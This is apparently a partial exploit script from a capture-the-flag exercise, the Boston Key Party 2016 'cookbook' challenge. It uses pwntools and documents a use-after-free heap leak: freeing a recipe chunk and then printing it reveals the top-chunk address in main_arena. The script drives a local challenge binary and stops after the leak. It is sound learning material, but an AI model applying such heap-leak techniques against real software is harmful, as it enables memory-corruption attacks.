# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Shamelessly copied Joshua Wang's write-up
#

from pwn import *


'''

information leakage: 'ptr to the top chunk' is revealed.

* create recipe

* new recipe -> malloc one large chunk
    CURRENT_RECIPE = calloc(1u, 0x40C)

    [head to ingredient list] [head to howmany list] [recipe name] [type] [info]
    ^                         ^                      ^             ^      ^
    |                         |                      |             |      |
    0                         4                      8            123    140

* add ingredient -> malloc two small chunks
    list_add(CURRENT_RECIPE, find_ingredient(nptr)) ->
        calloc(1u, 8u)
    list_add(CURRENT_RECIPE_HOWMANY, strtoul(ntpr)) ->
        calloc(1u, 8u)

* discard recipe -> the last (large) chunk gets freed and moved to bins. [head to howmany list] gets overwritten with the pointer which points somewhere in main_arena.binlist

    free(CURRENT_RECIPE)

* print current recipe -> 

         [ptr][ptr][name][type][info]
         [fd ][bk ]
                |
                |
main_arena      V
binlist  [ptr to the top chunk]

    for (i = 0; i < list_length(&CURRENT_RECIPE); i++) {
        v8 = nth_item(&CURRENT_RECIPE_HOWMANY, i)
        ...
    }
    printf("%zd - %s\n", v8);

'''

r = process('./cookbook')

s = lambda x: r.send(x + '\n')

if __name__ == '__main__':
    r.recvuntil("what's your name?")
    s('babo')

    s('c')
    s('n')
    s('a')
    s('basil')
    s('1')
    s('d')
    r.clean()
    s('p')
    resp = r.recv()
    s('q')

    LEAKED_TOP_CHUNK_ADDR = int(resp.split('\n')[3].split('-')[0])
    log.info('LEAKED_TOP_CHUNK_ADDR: 0x%x' % LEAKED_TOP_CHUNK_ADDR)
    pause()
